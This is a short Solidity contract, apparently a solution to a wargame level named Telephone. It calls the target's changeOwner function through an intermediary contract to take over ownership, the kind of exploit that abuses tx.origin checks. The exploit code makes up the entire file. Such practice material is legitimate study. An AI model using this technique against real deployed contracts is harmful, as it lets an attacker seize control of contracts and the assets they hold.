// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneAttacker {
    address public attack_address;

    constructor(address attack_address_in) public {
        attack_address = attack_address_in;
    }

    function attack(address newOwner) public {
        Telephone(attack_address).changeOwner(newOwner);
    }
}